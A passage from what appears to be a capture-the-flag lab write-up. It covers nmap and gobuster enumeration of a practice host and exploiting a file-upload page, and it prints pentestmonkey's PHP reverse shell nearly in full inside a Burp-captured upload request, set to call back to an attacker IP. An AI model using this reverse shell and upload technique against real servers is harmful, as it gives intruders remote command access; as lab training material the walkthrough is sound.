+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>0.00</span>s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>0.00</span>s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>0.00</span>s elapsed
+</span></span><span style=display:flex><span>Read data files from: <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/../</span>share<span style=color:#f92672>/</span>nmap
+</span></span><span style=display:flex><span>Service detection performed<span style=color:#f92672>.</span> Please report any incorrect results at https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>submit<span style=color:#f92672>/</span> <span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Nmap done: <span style=color:#ae81ff>1</span> IP address (<span style=color:#ae81ff>1</span> host up) scanned <span style=color:#f92672>in</span> <span style=color:#ae81ff>28.35</span> seconds
+</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>10</span> (<span style=color:#ae81ff>416</span>B) <span style=color:#f92672>|</span> Rcvd: <span style=color:#ae81ff>7</span> (<span style=color:#ae81ff>292</span>B)
+</span></span></code></pre></div><p>There was an apache server running on port 3333.</p><h1 id=enumeration>Enumeration
+<a class=anchor href=#enumeration>#</a></h1><p>Let&rsquo;s fuzz for directories using gobuster.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> gobuster dir <span style=color:#f92672>-</span>w <span style=color:#f92672>~/</span>tools<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>directory<span style=color:#f92672>-</span>list<span style=color:#f92672>-</span><span style=color:#ae81ff>2.3</span><span style=color:#f92672>-</span>small<span style=color:#f92672>.</span>txt <span style=color:#f92672>-</span>u http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Gobuster v3<span style=color:#ae81ff>.6</span>
+</span></span><span style=display:flex><span>by OJ Reeves (<span style=color:#a6e22e>@TheColonial</span>) <span style=color:#f92672>&amp;</span> Christian Mehlmauer (<span style=color:#a6e22e>@firefart</span>)
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Url:                     http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Method:                  GET
+</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Threads:                 <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Wordlist:                <span style=color:#f92672>/</span>root<span style=color:#f92672>/</span>tools<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>directory<span style=color:#f92672>-</span>list<span style=color:#f92672>-</span><span style=color:#ae81ff>2.3</span><span style=color:#f92672>-</span>small<span style=color:#f92672>.</span>txt
+</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Negative Status codes:   <span style=color:#ae81ff>404</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] User Agent:              gobuster<span style=color:#f92672>/</span><span style=color:#ae81ff>3.6</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Timeout:                 <span style=color:#ae81ff>10</span>s
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Starting gobuster <span style=color:#f92672>in</span> directory enumeration mode
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>/</span>images               (Status: <span style=color:#ae81ff>301</span>) [Size: <span style=color:#ae81ff>322</span>] [<span style=color:#f92672>--&gt;</span> http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>images<span style=color:#f92672>/</span>]
+</span></span><span style=display:flex><span><span style=color:#f92672>/</span>css                  (Status: <span style=color:#ae81ff>301</span>) [Size: <span style=color:#ae81ff>319</span>] [<span style=color:#f92672>--&gt;</span> http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>css<span style=color:#f92672>/</span>]
+</span></span><span style=display:flex><span><span style=color:#f92672>/</span>js                   (Status: <span style=color:#ae81ff>301</span>) [Size: <span style=color:#ae81ff>318</span>] [<span style=color:#f92672>--&gt;</span> http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>js<span style=color:#f92672>/</span>]
+</span></span><span style=display:flex><span><span style=color:#f92672>/</span>fonts                (Status: <span style=color:#ae81ff>301</span>) [Size: <span style=color:#ae81ff>321</span>] [<span style=color:#f92672>--&gt;</span> http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>fonts<span style=color:#f92672>/</span>]
+</span></span><span style=display:flex><span><span style=color:#f92672>/</span>internal             (Status: <span style=color:#ae81ff>301</span>) [Size: <span style=color:#ae81ff>324</span>] [<span style=color:#f92672>--&gt;</span> http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>internal<span style=color:#f92672>/</span>]
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Finished
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span></code></pre></div><p>There is a path /internal/ with a file upload functionality.</p><h1 id=exploitation>Exploitation
+<a class=anchor href=#exploitation>#</a></h1><p>Upon viewing it, there was a file upload functionality. Using this we can upload a malicious php file to get a reverse shell.</p><p>Copy the php file from the following resource and edit the ip address to tun0 ip address.</p><blockquote><p><a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p></blockquote><p>Let us try to upload a php file and see if it&rsquo;s accepting the file type. The file type php is not accepted.</p><p>Start Burp Suite and configure the proxy in the browser.</p><p>Upload the php file that we just created and capture the request in Burp.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>POST</span> <span style=color:#f92672>/</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>/</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Host</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>118.9</span><span style=color:#f92672>:</span><span style=color:#ae81ff>3333</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>User</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Agent</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Mozilla</span><span style=color:#f92672>/</span><span style=color:#ae81ff>5.0</span> (<span style=color:#a6e22e>X11</span>; <span style=color:#a6e22e>Linux</span> <span style=color:#a6e22e>aarch64</span>; <span style=color:#a6e22e>rv</span><span style=color:#f92672>:</span><span style=color:#ae81ff>102.0</span>) <span style=color:#a6e22e>Gecko</span><span style=color:#f92672>/</span><span style=color:#ae81ff>20100101</span> <span style=color:#a6e22e>Firefox</span><span style=color:#f92672>/</span><span style=color:#ae81ff>102.0</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Accept</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>text</span><span style=color:#f92672>/</span><span style=color:#a6e22e>html</span>,<span style=color:#a6e22e>application</span><span style=color:#f92672>/</span><span style=color:#a6e22e>xhtml</span><span style=color:#f92672>+</span><span style=color:#a6e22e>xml</span>,<span style=color:#a6e22e>application</span><span style=color:#f92672>/</span><span style=color:#a6e22e>xml</span>;<span style=color:#a6e22e>q</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0.9</span>,<span style=color:#a6e22e>image</span><span style=color:#f92672>/</span><span style=color:#a6e22e>avif</span>,<span style=color:#a6e22e>image</span><span style=color:#f92672>/</span><span style=color:#a6e22e>webp</span>,<span style=color:#f92672>*/*</span>;<span style=color:#a6e22e>q</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0.8</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Accept</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Language</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>en</span><span style=color:#f92672>-</span><span style=color:#a6e22e>US</span>,<span style=color:#a6e22e>en</span>;<span style=color:#a6e22e>q</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0.5</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Accept</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Encoding</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>gzip</span>, <span style=color:#a6e22e>deflate</span>, <span style=color:#a6e22e>br</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Type</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>multipart</span><span style=color:#f92672>/</span><span style=color:#a6e22e>form</span><span style=color:#f92672>-</span><span style=color:#a6e22e>data</span>; <span style=color:#a6e22e>boundary</span><span style=color:#f92672>=---------------------------</span><span style=color:#ae81ff>7905088481562265153553597258</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Length</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>5845</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Origin</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>118.9</span><span style=color:#f92672>:</span><span style=color:#ae81ff>3333</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Connection</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>close</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Referer</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>118.9</span><span style=color:#f92672>:</span><span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>/</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Upgrade</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Insecure</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Requests</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>-----------------------------</span><span style=color:#ae81ff>7905088481562265153553597258</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Disposition</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>form</span><span style=color:#f92672>-</span><span style=color:#a6e22e>data</span>; <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; <span style=color:#a6e22e>filename</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;php-reverse-shell.php&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Type</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>application</span><span style=color:#f92672>/</span><span style=color:#a6e22e>x</span><span style=color:#f92672>-</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// php-reverse-shell - A Reverse Shell implementation in PHP
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// This tool may be used for legal purposes only.  Users take full responsibility
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// for any actions performed using this tool.  The author accepts no liability
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// for damage caused by this tool.  If these terms are not acceptable to you, then
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// do not use this tool.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// In all other respects the GPL version 2 applies:
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// This program is free software; you can redistribute it and/or modify
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// it under the terms of the GNU General Public License version 2 as
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// published by the Free Software Foundation.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// This program is distributed in the hope that it will be useful,
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// but WITHOUT ANY WARRANTY; without even the implied warranty of
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// GNU General Public License for more details.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// You should have received a copy of the GNU General Public License along
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// with this program; if not, write to the Free Software Foundation, Inc.,
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// This tool may be used for legal purposes only.  Users take full responsibility
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// for any actions performed using this tool.  If these terms are not acceptable to
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// you, then do not use this tool.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// You are encouraged to send comments, improvements or suggestions to
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// me at pentestmonkey@pentestmonkey.net
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Description
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// -----------
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// This script will make an outbound TCP connection to a hardcoded IP and port.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// The recipient will be given a shell running as the current user (apache normally).
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Limitations
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// -----------
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Usage
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// -----
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>set_time_limit</span> (<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>$VERSION <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1.0&#34;</span>;
+</span></span><span style=display:flex><span>$ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.6.10.164&#39;</span>;  <span style=color:#75715e>// CHANGE THIS
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$port <span style=color:#f92672>=</span> <span style=color:#ae81ff>4444</span>;       <span style=color:#75715e>// CHANGE THIS
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$chunk_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>1400</span>;
+</span></span><span style=display:flex><span>$write_a <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>$error_a <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>$shell <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;uname -a; w; id; /bin/sh -i&#39;</span>;
+</span></span><span style=display:flex><span>$daemon <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>$debug <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Daemonise ourself if possible to avoid zombies later
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// pcntl_fork is hardly ever available, but will allow us to daemonise
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// our php process and avoid zombies.  Worth a try...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;pcntl_fork&#39;</span>)) {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Fork and have the parent process exit
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	$pid <span style=color:#f92672>=</span> <span style=color:#a6e22e>pcntl_fork</span>();
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ($pid <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Can&#39;t fork&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ($pid) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>0</span>);  <span style=color:#75715e>// Parent exits
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Make the current process a session leader
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// Will only succeed if we forked
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>posix_setsid</span>() <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;Error: Can&#39;t setsid()&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	$daemon <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Change to a safe directory
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>chdir</span>(<span style=color:#e6db74>&#34;/&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Remove any umask we inherited
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>umask</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Do the reverse shell...
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Open reverse connection
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$sock <span style=color:#f92672>=</span> <span style=color:#a6e22e>fsockopen</span>($ip, $port, $errno, $errstr, <span style=color:#ae81ff>30</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$sock) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$errstr</span><span style=color:#e6db74> (</span><span style=color:#e6db74>$errno</span><span style=color:#e6db74>)&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Spawn shell process
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$descriptorspec <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>),  <span style=color:#75715e>// stdin is a pipe that the child will read from
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   <span style=color:#ae81ff>1</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>),  <span style=color:#75715e>// stdout is a pipe that the child will write to
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   <span style=color:#ae81ff>2</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>)   <span style=color:#75715e>// stderr is a pipe that the child will write to
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$process <span style=color:#f92672>=</span> <span style=color:#a6e22e>proc_open</span>($shell, $descriptorspec, $pipes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>is_resource</span>($process)) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Can&#39;t spawn shell&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Set everything to non-blocking
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>stream_set_blocking</span>($pipes[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>stream_set_blocking</span>($pipes[<span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>stream_set_blocking</span>($pipes[<span style=color:#ae81ff>2</span>], <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>stream_set_blocking</span>($sock, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;Successfully opened reverse shell to </span><span style=color:#e6db74>$ip</span><span style=color:#e6db74>:</span><span style=color:#e6db74>$port</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Check for end of TCP connection
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>feof</span>($sock)) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Shell connection terminated&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Check for end of STDOUT
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>feof</span>($pipes[<span style=color:#ae81ff>1</span>])) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Shell process terminated&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Wait until a command is end down $sock, or some
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// command output is available on STDOUT or STDERR
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	$read_a <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>($sock, $pipes[<span style=color:#ae81ff>1</span>], $pipes[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>	$num_changed_sockets <span style=color:#f92672>=</span> <span style=color:#a6e22e>stream_select</span>($read_a, $write_a, $error_a, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// If we can read from the TCP socket, send
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// data to process&#39;s STDIN
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($sock, $read_a)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;SOCK READ&#34;</span>);
+</span></span><span style=display:flex><span>		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>fread</span>($sock, $chunk_size);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;SOCK: </span><span style=color:#e6db74>$input</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fwrite</span>($pipes[<span style=color:#ae81ff>0</span>], $input);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// If we can read from the process&#39;s STDOUT
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// send data down tcp connection
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($pipes[<span style=color:#ae81ff>1</span>], $read_a)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDOUT READ&#34;</span>);
